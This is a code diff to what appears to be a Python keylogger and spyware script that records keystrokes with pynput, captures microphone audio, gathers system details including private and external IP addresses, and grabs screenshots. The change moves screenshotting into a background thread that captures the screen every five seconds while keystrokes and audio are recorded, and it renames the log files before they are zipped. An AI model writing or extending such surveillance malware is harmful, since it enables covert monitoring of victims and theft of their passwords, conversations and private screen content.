@@ -16,6 +16,7 @@ from pynput.keyboard import Key, Listener
 
 import time
 import os
+import threading
 
 from scipy.io.wavfile import write
 import sounddevice as sd
@@ -56,8 +57,6 @@ if not os.path.exists(logpath):
 system_information = "system.txt"
 audio_information = "audio.wav"
 clipboard_information = "clipboard.txt"
-screenshot_information_beg = "screenshot_beg.png"
-screenshot_information_end = "screenshot_end.png"
 keys_information = "key_log.txt"
 
 # Encrypted files
@@ -79,10 +78,14 @@ def on_press_func(key):
         except AttributeError:
             key_f.write('(' + str(key) + ')')
 
-def take_screenshot(file_name):
-    screenshot = ImageGrab.grab()
-    screenshot.save(logpath + file_prefix + file_name)
-    screenshot.close()
+def take_screenshot(flag_take_screenshot):
+    iteration = 1
+    while flag_take_screenshot.is_set():
+        screenshot = ImageGrab.grab()
+        screenshot.save(logpath + file_prefix + " - " + "screenshot" + str(iteration) + ".png")
+        screenshot.close()
+        time.sleep(5)
+        iteration += 1
 
 # System Information
 
@@ -104,7 +107,7 @@ s.connect(("8.8.8.8", 80))
 sys_details.update({'private_IP' : s.getsockname()[0] }) # Will return the private IP of the machine
 sys_details.update({'external_IP' : get('https://api.ipify.org').text})
 
-sys_f = open(logpath + file_prefix + system_information, 'a')
+sys_f = open(logpath + file_prefix + " - " + system_information, 'a')
 
 for item in sys_details.items():
     sys_f.write(str(item) + '\n\n')
@@ -115,13 +118,17 @@ sys_f.close()
 
 # Keylogging, Microphone Capture and Screenshotting
 
+flag_take_screenshot = threading.Event()
+flag_take_screenshot.set()
+
+t = threading.Thread(target=take_screenshot, args=(flag_take_screenshot, )) # The comma is required. Otherwise Itereable Error is thrown
+t.start()
+
 sampling_freq = 44100
 
 myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
 
-take_screenshot(screenshot_information_beg)
-
-key_f = open(logpath + file_prefix + keys_information, 'a')
+key_f = open(logpath + file_prefix + " - " + keys_information, 'a')
 
 stopping_time = time.time() + duration
 
@@ -132,9 +139,9 @@ with Listener(
 key_f.close()
 sd.wait()
 
-write(logpath + file_prefix + audio_information, sampling_freq, myrecording)
+write(logpath + file_prefix + " - " + audio_information, sampling_freq, myrecording)
 
-take_screenshot(screenshot_information_end)
+flag_take_screenshot.clear()
 
 # Creating zipfile of all log files
 
